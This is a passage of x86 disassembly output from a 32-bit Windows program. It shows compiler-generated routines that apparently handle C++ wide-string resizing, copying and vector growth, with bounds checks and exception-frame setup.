  4071b3:	68 a8 a8 40 00       	push   $0x40a8a8
  4071b8:	ff 15 30 a1 40 00    	call   *0x40a130
  4071be:	2b c1                	sub    %ecx,%eax
  4071c0:	3b c3                	cmp    %ebx,%eax
  4071c2:	73 02                	jae    0x4071c6
  4071c4:	8b d8                	mov    %eax,%ebx
  4071c6:	8b 47 10             	mov    0x10(%edi),%eax
  4071c9:	83 c9 ff             	or     $0xffffffff,%ecx
  4071cc:	2b c8                	sub    %eax,%ecx
  4071ce:	3b cb                	cmp    %ebx,%ecx
  4071d0:	77 0b                	ja     0x4071dd
  4071d2:	68 98 a8 40 00       	push   $0x40a898
  4071d7:	ff 15 38 a1 40 00    	call   *0x40a138
  4071dd:	85 db                	test   %ebx,%ebx
  4071df:	74 65                	je     0x407246
  4071e1:	56                   	push   %esi
  4071e2:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  4071e5:	8b c7                	mov    %edi,%eax
  4071e7:	e8 b4 02 00 00       	call   0x4074a0
  4071ec:	84 c0                	test   %al,%al
  4071ee:	74 55                	je     0x407245
  4071f0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4071f3:	b8 08 00 00 00       	mov    $0x8,%eax
  4071f8:	39 41 14             	cmp    %eax,0x14(%ecx)
  4071fb:	72 02                	jb     0x4071ff
  4071fd:	8b 09                	mov    (%ecx),%ecx
  4071ff:	39 47 14             	cmp    %eax,0x14(%edi)
  407202:	72 04                	jb     0x407208
  407204:	8b 07                	mov    (%edi),%eax
  407206:	eb 02                	jmp    0x40720a
  407208:	8b c7                	mov    %edi,%eax
  40720a:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  40720d:	52                   	push   %edx
  40720e:	8b 55 0c             	mov    0xc(%ebp),%edx
  407211:	8d 0c 51             	lea    (%ecx,%edx,2),%ecx
  407214:	8b 57 10             	mov    0x10(%edi),%edx
  407217:	51                   	push   %ecx
  407218:	8d 04 50             	lea    (%eax,%edx,2),%eax
  40721b:	50                   	push   %eax
  40721c:	e8 11 19 00 00       	call   0x408b32
  407221:	83 c4 0c             	add    $0xc,%esp
  407224:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  407228:	89 77 10             	mov    %esi,0x10(%edi)
  40722b:	72 10                	jb     0x40723d
  40722d:	8b 07                	mov    (%edi),%eax
  40722f:	33 c9                	xor    %ecx,%ecx
  407231:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  407235:	5e                   	pop    %esi
  407236:	8b c7                	mov    %edi,%eax
  407238:	5b                   	pop    %ebx
  407239:	5d                   	pop    %ebp
  40723a:	c2 08 00             	ret    $0x8
  40723d:	8b c7                	mov    %edi,%eax
  40723f:	33 c9                	xor    %ecx,%ecx
  407241:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  407245:	5e                   	pop    %esi
  407246:	8b c7                	mov    %edi,%eax
  407248:	5b                   	pop    %ebx
  407249:	5d                   	pop    %ebp
  40724a:	c2 08 00             	ret    $0x8
  40724d:	cc                   	int3
  40724e:	cc                   	int3
  40724f:	cc                   	int3
  407250:	57                   	push   %edi
  407251:	8b f8                	mov    %eax,%edi
  407253:	8b 4f 14             	mov    0x14(%edi),%ecx
  407256:	83 f9 08             	cmp    $0x8,%ecx
  407259:	72 02                	jb     0x40725d
  40725b:	8b 07                	mov    (%edi),%eax
  40725d:	3d 10 a6 40 00       	cmp    $0x40a610,%eax
  407262:	77 37                	ja     0x40729b
  407264:	83 f9 08             	cmp    $0x8,%ecx
  407267:	72 04                	jb     0x40726d
  407269:	8b 07                	mov    (%edi),%eax
  40726b:	eb 02                	jmp    0x40726f
  40726d:	8b c7                	mov    %edi,%eax
  40726f:	8b 57 10             	mov    0x10(%edi),%edx
  407272:	8d 04 50             	lea    (%eax,%edx,2),%eax
  407275:	3d 10 a6 40 00       	cmp    $0x40a610,%eax
  40727a:	76 1f                	jbe    0x40729b
  40727c:	83 f9 08             	cmp    $0x8,%ecx
  40727f:	72 04                	jb     0x407285
  407281:	8b 07                	mov    (%edi),%eax
  407283:	eb 02                	jmp    0x407287
  407285:	8b c7                	mov    %edi,%eax
  407287:	b9 10 a6 40 00       	mov    $0x40a610,%ecx
  40728c:	2b c8                	sub    %eax,%ecx
  40728e:	d1 f9                	sar    $1,%ecx
  407290:	51                   	push   %ecx
  407291:	57                   	push   %edi
  407292:	8b c3                	mov    %ebx,%eax
  407294:	e8 07 ff ff ff       	call   0x4071a0
  407299:	5f                   	pop    %edi
  40729a:	c3                   	ret
  40729b:	8b 47 10             	mov    0x10(%edi),%eax
  40729e:	83 ca ff             	or     $0xffffffff,%edx
  4072a1:	2b d0                	sub    %eax,%edx
  4072a3:	3b d3                	cmp    %ebx,%edx
  4072a5:	77 0b                	ja     0x4072b2
  4072a7:	68 98 a8 40 00       	push   $0x40a898
  4072ac:	ff 15 38 a1 40 00    	call   *0x40a138
  4072b2:	85 db                	test   %ebx,%ebx
  4072b4:	74 52                	je     0x407308
  4072b6:	56                   	push   %esi
  4072b7:	8d 34 18             	lea    (%eax,%ebx,1),%esi
  4072ba:	8b c7                	mov    %edi,%eax
  4072bc:	e8 df 01 00 00       	call   0x4074a0
  4072c1:	84 c0                	test   %al,%al
  4072c3:	74 42                	je     0x407307
  4072c5:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4072c9:	72 04                	jb     0x4072cf
  4072cb:	8b 07                	mov    (%edi),%eax
  4072cd:	eb 02                	jmp    0x4072d1
  4072cf:	8b c7                	mov    %edi,%eax
  4072d1:	8b 57 10             	mov    0x10(%edi),%edx
  4072d4:	8d 0c 1b             	lea    (%ebx,%ebx,1),%ecx
  4072d7:	51                   	push   %ecx
  4072d8:	8d 04 50             	lea    (%eax,%edx,2),%eax
  4072db:	68 10 a6 40 00       	push   $0x40a610
  4072e0:	50                   	push   %eax
  4072e1:	e8 4c 18 00 00       	call   0x408b32
  4072e6:	83 c4 0c             	add    $0xc,%esp
  4072e9:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4072ed:	89 77 10             	mov    %esi,0x10(%edi)
  4072f0:	72 0d                	jb     0x4072ff
  4072f2:	8b 07                	mov    (%edi),%eax
  4072f4:	33 c9                	xor    %ecx,%ecx
  4072f6:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  4072fa:	5e                   	pop    %esi
  4072fb:	8b c7                	mov    %edi,%eax
  4072fd:	5f                   	pop    %edi
  4072fe:	c3                   	ret
  4072ff:	8b c7                	mov    %edi,%eax
  407301:	33 c9                	xor    %ecx,%ecx
  407303:	66 89 0c 70          	mov    %cx,(%eax,%esi,2)
  407307:	5e                   	pop    %esi
  407308:	8b c7                	mov    %edi,%eax
  40730a:	5f                   	pop    %edi
  40730b:	c3                   	ret
  40730c:	cc                   	int3
  40730d:	cc                   	int3
  40730e:	cc                   	int3
  40730f:	cc                   	int3
  407310:	55                   	push   %ebp
  407311:	8b ec                	mov    %esp,%ebp
  407313:	56                   	push   %esi
  407314:	8b f0                	mov    %eax,%esi
  407316:	57                   	push   %edi
  407317:	8b f9                	mov    %ecx,%edi
  407319:	85 f6                	test   %esi,%esi
  40731b:	74 58                	je     0x407375
  40731d:	8b 4f 14             	mov    0x14(%edi),%ecx
  407320:	83 f9 08             	cmp    $0x8,%ecx
  407323:	72 04                	jb     0x407329
  407325:	8b 07                	mov    (%edi),%eax
  407327:	eb 02                	jmp    0x40732b
  407329:	8b c7                	mov    %edi,%eax
  40732b:	3b f0                	cmp    %eax,%esi
  40732d:	72 46                	jb     0x407375
  40732f:	83 f9 08             	cmp    $0x8,%ecx
  407332:	72 04                	jb     0x407338
  407334:	8b 07                	mov    (%edi),%eax
  407336:	eb 02                	jmp    0x40733a
  407338:	8b c7                	mov    %edi,%eax
  40733a:	8b 57 10             	mov    0x10(%edi),%edx
  40733d:	8d 04 50             	lea    (%eax,%edx,2),%eax
  407340:	3b c6                	cmp    %esi,%eax
  407342:	76 31                	jbe    0x407375
  407344:	83 f9 08             	cmp    $0x8,%ecx
  407347:	72 16                	jb     0x40735f
  407349:	8b 07                	mov    (%edi),%eax
  40734b:	2b f0                	sub    %eax,%esi
  40734d:	8b 45 08             	mov    0x8(%ebp),%eax
  407350:	d1 fe                	sar    $1,%esi
  407352:	56                   	push   %esi
  407353:	57                   	push   %edi
  407354:	e8 e7 f3 ff ff       	call   0x406740
  407359:	5f                   	pop    %edi
  40735a:	5e                   	pop    %esi
  40735b:	5d                   	pop    %ebp
  40735c:	c2 04 00             	ret    $0x4
  40735f:	8b c7                	mov    %edi,%eax
  407361:	2b f0                	sub    %eax,%esi
  407363:	8b 45 08             	mov    0x8(%ebp),%eax
  407366:	d1 fe                	sar    $1,%esi
  407368:	56                   	push   %esi
  407369:	57                   	push   %edi
  40736a:	e8 d1 f3 ff ff       	call   0x406740
  40736f:	5f                   	pop    %edi
  407370:	5e                   	pop    %esi
  407371:	5d                   	pop    %ebp
  407372:	c2 04 00             	ret    $0x4
  407375:	53                   	push   %ebx
  407376:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407379:	81 fb fe ff ff 7f    	cmp    $0x7ffffffe,%ebx
  40737f:	76 0b                	jbe    0x40738c
  407381:	68 98 a8 40 00       	push   $0x40a898
  407386:	ff 15 38 a1 40 00    	call   *0x40a138
  40738c:	8b 47 14             	mov    0x14(%edi),%eax
  40738f:	3b c3                	cmp    %ebx,%eax
  407391:	73 19                	jae    0x4073ac
  407393:	8b 4f 10             	mov    0x10(%edi),%ecx
  407396:	51                   	push   %ecx
  407397:	53                   	push   %ebx
  407398:	57                   	push   %edi
  407399:	e8 92 04 00 00       	call   0x407830
  40739e:	85 db                	test   %ebx,%ebx
  4073a0:	74 68                	je     0x40740a
  4073a2:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4073a6:	72 2e                	jb     0x4073d6
  4073a8:	8b 07                	mov    (%edi),%eax
  4073aa:	eb 2c                	jmp    0x4073d8
  4073ac:	85 db                	test   %ebx,%ebx
  4073ae:	75 f2                	jne    0x4073a2
  4073b0:	89 5f 10             	mov    %ebx,0x10(%edi)
  4073b3:	83 f8 08             	cmp    $0x8,%eax
  4073b6:	72 10                	jb     0x4073c8
  4073b8:	8b 07                	mov    (%edi),%eax
  4073ba:	33 d2                	xor    %edx,%edx
  4073bc:	5b                   	pop    %ebx
  4073bd:	66 89 10             	mov    %dx,(%eax)
  4073c0:	8b c7                	mov    %edi,%eax
  4073c2:	5f                   	pop    %edi
  4073c3:	5e                   	pop    %esi
  4073c4:	5d                   	pop    %ebp
  4073c5:	c2 04 00             	ret    $0x4
  4073c8:	5b                   	pop    %ebx
  4073c9:	8b c7                	mov    %edi,%eax
  4073cb:	33 d2                	xor    %edx,%edx
  4073cd:	5f                   	pop    %edi
  4073ce:	66 89 10             	mov    %dx,(%eax)
  4073d1:	5e                   	pop    %esi
  4073d2:	5d                   	pop    %ebp
  4073d3:	c2 04 00             	ret    $0x4
  4073d6:	8b c7                	mov    %edi,%eax
  4073d8:	03 db                	add    %ebx,%ebx
  4073da:	53                   	push   %ebx
  4073db:	56                   	push   %esi
  4073dc:	50                   	push   %eax
  4073dd:	e8 50 17 00 00       	call   0x408b32
  4073e2:	8b 45 08             	mov    0x8(%ebp),%eax
  4073e5:	83 c4 0c             	add    $0xc,%esp
  4073e8:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  4073ec:	89 47 10             	mov    %eax,0x10(%edi)
  4073ef:	72 11                	jb     0x407402
  4073f1:	8b 07                	mov    (%edi),%eax
  4073f3:	33 c9                	xor    %ecx,%ecx
  4073f5:	66 89 0c 03          	mov    %cx,(%ebx,%eax,1)
  4073f9:	5b                   	pop    %ebx
  4073fa:	8b c7                	mov    %edi,%eax
  4073fc:	5f                   	pop    %edi
  4073fd:	5e                   	pop    %esi
  4073fe:	5d                   	pop    %ebp
  4073ff:	c2 04 00             	ret    $0x4
  407402:	8b c7                	mov    %edi,%eax
  407404:	33 c9                	xor    %ecx,%ecx
  407406:	66 89 0c 03          	mov    %cx,(%ebx,%eax,1)
  40740a:	5b                   	pop    %ebx
  40740b:	8b c7                	mov    %edi,%eax
  40740d:	5f                   	pop    %edi
  40740e:	5e                   	pop    %esi
  40740f:	5d                   	pop    %ebp
  407410:	c2 04 00             	ret    $0x4
  407413:	cc                   	int3
  407414:	cc                   	int3
  407415:	cc                   	int3
  407416:	cc                   	int3
  407417:	cc                   	int3
  407418:	cc                   	int3
  407419:	cc                   	int3
  40741a:	cc                   	int3
  40741b:	cc                   	int3
  40741c:	cc                   	int3
  40741d:	cc                   	int3
  40741e:	cc                   	int3
  40741f:	cc                   	int3
  407420:	57                   	push   %edi
  407421:	8b f8                	mov    %eax,%edi
  407423:	8b 46 10             	mov    0x10(%esi),%eax
  407426:	3b c1                	cmp    %ecx,%eax
  407428:	73 0b                	jae    0x407435
  40742a:	68 a8 a8 40 00       	push   $0x40a8a8
  40742f:	ff 15 30 a1 40 00    	call   *0x40a130
  407435:	2b c1                	sub    %ecx,%eax
  407437:	3b c7                	cmp    %edi,%eax
  407439:	73 02                	jae    0x40743d
  40743b:	8b f8                	mov    %eax,%edi
  40743d:	85 ff                	test   %edi,%edi
  40743f:	74 56                	je     0x407497
  407441:	8b 56 14             	mov    0x14(%esi),%edx
  407444:	53                   	push   %ebx
  407445:	83 fa 08             	cmp    $0x8,%edx
  407448:	72 04                	jb     0x40744e
  40744a:	8b 1e                	mov    (%esi),%ebx
  40744c:	eb 02                	jmp    0x407450
  40744e:	8b de                	mov    %esi,%ebx
  407450:	83 fa 08             	cmp    $0x8,%edx
  407453:	72 04                	jb     0x407459
  407455:	8b 16                	mov    (%esi),%edx
  407457:	eb 02                	jmp    0x40745b
  407459:	8b d6                	mov    %esi,%edx
  40745b:	2b c7                	sub    %edi,%eax
  40745d:	03 c0                	add    %eax,%eax
  40745f:	50                   	push   %eax
  407460:	8d 04 39             	lea    (%ecx,%edi,1),%eax
  407463:	8d 04 43             	lea    (%ebx,%eax,2),%eax
  407466:	50                   	push   %eax
  407467:	8d 0c 4a             	lea    (%edx,%ecx,2),%ecx
  40746a:	51                   	push   %ecx
  40746b:	ff 15 fc a1 40 00    	call   *0x40a1fc
  407471:	8b 46 10             	mov    0x10(%esi),%eax
  407474:	83 c4 0c             	add    $0xc,%esp
  407477:	2b c7                	sub    %edi,%eax
  407479:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  40747d:	89 46 10             	mov    %eax,0x10(%esi)
  407480:	5b                   	pop    %ebx
  407481:	72 0c                	jb     0x40748f
  407483:	8b 0e                	mov    (%esi),%ecx
  407485:	33 d2                	xor    %edx,%edx
  407487:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  40748b:	8b c6                	mov    %esi,%eax
  40748d:	5f                   	pop    %edi
  40748e:	c3                   	ret
  40748f:	8b ce                	mov    %esi,%ecx
  407491:	33 d2                	xor    %edx,%edx
  407493:	66 89 14 41          	mov    %dx,(%ecx,%eax,2)
  407497:	8b c6                	mov    %esi,%eax
  407499:	5f                   	pop    %edi
  40749a:	c3                   	ret
  40749b:	cc                   	int3
  40749c:	cc                   	int3
  40749d:	cc                   	int3
  40749e:	cc                   	int3
  40749f:	cc                   	int3
  4074a0:	81 fe fe ff ff 7f    	cmp    $0x7ffffffe,%esi
  4074a6:	76 0b                	jbe    0x4074b3
  4074a8:	68 98 a8 40 00       	push   $0x40a898
  4074ad:	ff 15 38 a1 40 00    	call   *0x40a138
  4074b3:	8b 48 14             	mov    0x14(%eax),%ecx
  4074b6:	3b ce                	cmp    %esi,%ecx
  4074b8:	73 14                	jae    0x4074ce
  4074ba:	8b 48 10             	mov    0x10(%eax),%ecx
  4074bd:	51                   	push   %ecx
  4074be:	56                   	push   %esi
  4074bf:	50                   	push   %eax
  4074c0:	e8 6b 03 00 00       	call   0x407830
  4074c5:	33 c0                	xor    %eax,%eax
  4074c7:	3b c6                	cmp    %esi,%eax
  4074c9:	1b c0                	sbb    %eax,%eax
  4074cb:	f7 d8                	neg    %eax
  4074cd:	c3                   	ret
  4074ce:	85 f6                	test   %esi,%esi
  4074d0:	75 0f                	jne    0x4074e1
  4074d2:	89 70 10             	mov    %esi,0x10(%eax)
  4074d5:	83 f9 08             	cmp    $0x8,%ecx
  4074d8:	72 02                	jb     0x4074dc
  4074da:	8b 00                	mov    (%eax),%eax
  4074dc:	33 d2                	xor    %edx,%edx
  4074de:	66 89 10             	mov    %dx,(%eax)
  4074e1:	33 c0                	xor    %eax,%eax
  4074e3:	3b c6                	cmp    %esi,%eax
  4074e5:	1b c0                	sbb    %eax,%eax
  4074e7:	f7 d8                	neg    %eax
  4074e9:	c3                   	ret
  4074ea:	cc                   	int3
  4074eb:	cc                   	int3
  4074ec:	cc                   	int3
  4074ed:	cc                   	int3
  4074ee:	cc                   	int3
  4074ef:	cc                   	int3
  4074f0:	56                   	push   %esi
  4074f1:	8b f0                	mov    %eax,%esi
  4074f3:	8b 16                	mov    (%esi),%edx
  4074f5:	8b 46 04             	mov    0x4(%esi),%eax
  4074f8:	57                   	push   %edi
  4074f9:	2b c2                	sub    %edx,%eax
  4074fb:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
  407500:	d1 f8                	sar    $1,%eax
  407502:	2b f9                	sub    %ecx,%edi
  407504:	3b f8                	cmp    %eax,%edi
  407506:	73 0b                	jae    0x407513
  407508:	68 c0 a8 40 00       	push   $0x40a8c0
  40750d:	ff 15 38 a1 40 00    	call   *0x40a138
  407513:	03 c1                	add    %ecx,%eax
  407515:	8b 4e 08             	mov    0x8(%esi),%ecx
  407518:	2b ca                	sub    %edx,%ecx
  40751a:	d1 f9                	sar    $1,%ecx
  40751c:	3b c1                	cmp    %ecx,%eax
  40751e:	76 21                	jbe    0x407541
  407520:	8b d1                	mov    %ecx,%edx
  407522:	d1 ea                	shr    $1,%edx
  407524:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
  407529:	2b fa                	sub    %edx,%edi
  40752b:	3b f9                	cmp    %ecx,%edi
  40752d:	73 04                	jae    0x407533
  40752f:	33 c9                	xor    %ecx,%ecx
  407531:	eb 02                	jmp    0x407535
  407533:	03 ca                	add    %edx,%ecx
  407535:	3b c8                	cmp    %eax,%ecx
  407537:	73 02                	jae    0x40753b
  407539:	8b c8                	mov    %eax,%ecx
  40753b:	51                   	push   %ecx
  40753c:	e8 6f 04 00 00       	call   0x4079b0
  407541:	5f                   	pop    %edi
  407542:	5e                   	pop    %esi
  407543:	c3                   	ret
  407544:	cc                   	int3
  407545:	cc                   	int3
  407546:	cc                   	int3
  407547:	cc                   	int3
  407548:	cc                   	int3
  407549:	cc                   	int3
  40754a:	cc                   	int3
  40754b:	cc                   	int3
  40754c:	cc                   	int3
  40754d:	cc                   	int3
  40754e:	cc                   	int3
  40754f:	cc                   	int3
  407550:	55                   	push   %ebp
  407551:	8b ec                	mov    %esp,%ebp
  407553:	6a ff                	push   $0xffffffff
  407555:	68 50 8f 40 00       	push   $0x408f50
  40755a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407560:	50                   	push   %eax
  407561:	83 ec 08             	sub    $0x8,%esp
  407564:	53                   	push   %ebx
  407565:	56                   	push   %esi
  407566:	57                   	push   %edi
  407567:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40756c:	33 c5                	xor    %ebp,%eax
  40756e:	50                   	push   %eax
  40756f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407572:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407578:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40757b:	8b f1                	mov    %ecx,%esi
  40757d:	8b 7d 08             	mov    0x8(%ebp),%edi
  407580:	81 ff 49 92 24 09    	cmp    $0x9249249,%edi
  407586:	76 0b                	jbe    0x407593
  407588:	68 c0 a8 40 00       	push   $0x40a8c0
  40758d:	ff 15 38 a1 40 00    	call   *0x40a138
  407593:	8b 4e 08             	mov    0x8(%esi),%ecx
  407596:	2b 0e                	sub    (%esi),%ecx
  407598:	b8 93 24 49 92       	mov    $0x92492493,%eax
  40759d:	f7 e9                	imul   %ecx
  40759f:	03 d1                	add    %ecx,%edx
  4075a1:	c1 fa 04             	sar    $0x4,%edx
  4075a4:	8b c2                	mov    %edx,%eax
  4075a6:	c1 e8 1f             	shr    $0x1f,%eax
  4075a9:	03 c2                	add    %edx,%eax
  4075ab:	3b c7                	cmp    %edi,%eax
  4075ad:	73 7f                	jae    0x40762e
  4075af:	8b cf                	mov    %edi,%ecx
  4075b1:	e8 7a 04 00 00       	call   0x407a30
  4075b6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4075bd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4075c0:	8b 7e 04             	mov    0x4(%esi),%edi
  4075c3:	8b 16                	mov    (%esi),%edx
  4075c5:	51                   	push   %ecx
  4075c6:	57                   	push   %edi
  4075c7:	8b c8                	mov    %eax,%ecx
  4075c9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4075cc:	e8 df 09 00 00       	call   0x407fb0
  4075d1:	8b 3e                	mov    (%esi),%edi
  4075d3:	8b 4e 04             	mov    0x4(%esi),%ecx
  4075d6:	2b cf                	sub    %edi,%ecx
  4075d8:	b8 93 24 49 92       	mov    $0x92492493,%eax
  4075dd:	f7 e9                	imul   %ecx
  4075df:	03 d1                	add    %ecx,%edx
  4075e1:	c1 fa 04             	sar    $0x4,%edx
  4075e4:	8b da                	mov    %edx,%ebx
  4075e6:	c1 eb 1f             	shr    $0x1f,%ebx
  4075e9:	83 c4 08             	add    $0x8,%esp
  4075ec:	03 da                	add    %edx,%ebx
  4075ee:	85 ff                	test   %edi,%edi
  4075f0:	74 16                	je     0x407608
  4075f2:	8b 7e 04             	mov    0x4(%esi),%edi
  4075f5:	8b 06                	mov    (%esi),%eax
  4075f7:	e8 64 00 00 00       	call   0x407660
  4075fc:	8b 16                	mov    (%esi),%edx
  4075fe:	52                   	push   %edx
  4075ff:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407605:	83 c4 04             	add    $0x4,%esp
  407608:	8b 45 08             	mov    0x8(%ebp),%eax
  40760b:	8d 0c c5 00 00 00 00 	lea    0x0(,%eax,8),%ecx
  407612:	2b c8                	sub    %eax,%ecx
  407614:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407617:	8d 14 88             	lea    (%eax,%ecx,4),%edx
  40761a:	8d 0c dd 00 00 00 00 	lea    0x0(,%ebx,8),%ecx
  407621:	2b cb                	sub    %ebx,%ecx
  407623:	89 56 08             	mov    %edx,0x8(%esi)
  407626:	8d 14 88             	lea    (%eax,%ecx,4),%edx
  407629:	89 56 04             	mov    %edx,0x4(%esi)
  40762c:	89 06                	mov    %eax,(%esi)
  40762e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407631:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407638:	59                   	pop    %ecx
  407639:	5f                   	pop    %edi
  40763a:	5e                   	pop    %esi
  40763b:	5b                   	pop    %ebx
  40763c:	8b e5                	mov    %ebp,%esp
  40763e:	5d                   	pop    %ebp
  40763f:	c2 04 00             	ret    $0x4
  407642:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407645:	50                   	push   %eax
  407646:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40764c:	83 c4 04             	add    $0x4,%esp
  40764f:	6a 00                	push   $0x0
  407651:	6a 00                	push   $0x0
  407653:	e8 14 15 00 00       	call   0x408b6c
  407658:	cc                   	int3
  407659:	cc                   	int3
  40765a:	cc                   	int3
  40765b:	cc                   	int3
  40765c:	cc                   	int3
  40765d:	cc                   	int3
  40765e:	cc                   	int3
  40765f:	cc                   	int3
  407660:	56                   	push   %esi
  407661:	8b f0                	mov    %eax,%esi
  407663:	3b f7                	cmp    %edi,%esi
  407665:	74 2c                	je     0x407693
  407667:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  40766b:	72 0c                	jb     0x407679
  40766d:	8b 06                	mov    (%esi),%eax
  40766f:	50                   	push   %eax
  407670:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  407676:	83 c4 04             	add    $0x4,%esp
  407679:	33 c9                	xor    %ecx,%ecx
  40767b:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  407682:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  407689:	66 89 0e             	mov    %cx,(%esi)
  40768c:	83 c6 1c             	add    $0x1c,%esi
  40768f:	3b f7                	cmp    %edi,%esi
  407691:	75 d4                	jne    0x407667
  407693:	5e                   	pop    %esi
  407694:	c3                   	ret
  407695:	cc                   	int3
  407696:	cc                   	int3
  407697:	cc                   	int3
  407698:	cc                   	int3
  407699:	cc                   	int3
  40769a:	cc                   	int3
  40769b:	cc                   	int3
  40769c:	cc                   	int3
  40769d:	cc                   	int3
  40769e:	cc                   	int3
  40769f:	cc                   	int3
  4076a0:	8b 00                	mov    (%eax),%eax
  4076a2:	8b 08                	mov    (%eax),%ecx
  4076a4:	8b 51 04             	mov    0x4(%ecx),%edx
  4076a7:	8b 44 02 38          	mov    0x38(%edx,%eax,1),%eax
  4076ab:	85 c0                	test   %eax,%eax
  4076ad:	74 09                	je     0x4076b8
  4076af:	8b 10                	mov    (%eax),%edx
  4076b1:	8b c8                	mov    %eax,%ecx
  4076b3:	8b 42 08             	mov    0x8(%edx),%eax
  4076b6:	ff e0                	jmp    *%eax
  4076b8:	c3                   	ret
  4076b9:	cc                   	int3
  4076ba:	cc                   	int3
  4076bb:	cc                   	int3
  4076bc:	cc                   	int3
  4076bd:	cc                   	int3
  4076be:	cc                   	int3
  4076bf:	cc                   	int3
  4076c0:	55                   	push   %ebp
  4076c1:	8b ec                	mov    %esp,%ebp
  4076c3:	6a ff                	push   $0xffffffff
  4076c5:	68 60 8d 40 00       	push   $0x408d60
  4076ca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4076d0:	50                   	push   %eax
  4076d1:	83 ec 18             	sub    $0x18,%esp
  4076d4:	53                   	push   %ebx
  4076d5:	56                   	push   %esi
  4076d6:	57                   	push   %edi
  4076d7:	a1 18 e0 40 00       	mov    0x40e018,%eax
  4076dc:	33 c5                	xor    %ebp,%eax
  4076de:	50                   	push   %eax
  4076df:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4076e2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4076e8:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4076eb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4076ee:	8b 7d 08             	mov    0x8(%ebp),%edi
  4076f1:	8b f0                	mov    %eax,%esi
  4076f3:	83 ce 0f             	or     $0xf,%esi
  4076f6:	83 fe fe             	cmp    $0xfffffffe,%esi
  4076f9:	76 04                	jbe    0x4076ff
  4076fb:	8b f0                	mov    %eax,%esi
  4076fd:	eb 27                	jmp    0x407726
  4076ff:	8b 5f 14             	mov    0x14(%edi),%ebx
  407702:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
  407707:	f7 e6                	mul    %esi
  407709:	8b cb                	mov    %ebx,%ecx
  40770b:	d1 e9                	shr    $1,%ecx
  40770d:	d1 ea                	shr    $1,%edx
  40770f:	3b ca                	cmp    %edx,%ecx
  407711:	76 13                	jbe    0x407726
  407713:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407718:	2b c1                	sub    %ecx,%eax
  40771a:	8d 34 19             	lea    (%ecx,%ebx,1),%esi
  40771d:	3b d8                	cmp    %eax,%ebx
  40771f:	76 05                	jbe    0x407726
  407721:	be fe ff ff ff       	mov    $0xfffffffe,%esi
  407726:	33 c0                	xor    %eax,%eax
  407728:	8d 4e 01             	lea    0x1(%esi),%ecx
  40772b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40772e:	3b c8                	cmp    %eax,%ecx
  407730:	76 13                	jbe    0x407745
  407732:	83 f9 ff             	cmp    $0xffffffff,%ecx
  407735:	77 13                	ja     0x40774a
  407737:	51                   	push   %ecx
  407738:	ff 15 ec a1 40 00    	call   *0x40a1ec
  40773e:	83 c4 04             	add    $0x4,%esp
  407741:	85 c0                	test   %eax,%eax
  407743:	74 05                	je     0x40774a
  407745:	89 45 0c             	mov    %eax,0xc(%ebp)
  407748:	eb 4d                	jmp    0x407797
  40774a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40774d:	51                   	push   %ecx
  40774e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407751:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  407758:	ff 15 f4 a1 40 00    	call   *0x40a1f4
  40775e:	68 58 b0 40 00       	push   $0x40b058
  407763:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407766:	52                   	push   %edx
  407767:	c7 45 dc e4 a8 40 00 	movl   $0x40a8e4,-0x24(%ebp)
  40776e:	e8 f9 13 00 00       	call   0x408b6c
  407773:	8b 45 0c             	mov    0xc(%ebp),%eax
  407776:	8d 48 01             	lea    0x1(%eax),%ecx
  407779:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40777c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40777f:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  407783:	e8 f8 ee ff ff       	call   0x406680
  407788:	89 45 0c             	mov    %eax,0xc(%ebp)
  40778b:	b8 91 77 40 00       	mov    $0x407791,%eax
  407790:	c3                   	ret
  407791:	8b 7d 08             	mov    0x8(%ebp),%edi
  407794:	8b 75 e8             	mov    -0x18(%ebp),%esi
  407797:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40779a:	85 db                	test   %ebx,%ebx
  40779c:	74 1a                	je     0x4077b8
  40779e:	83 7f 14 10          	cmpl   $0x10,0x14(%edi)
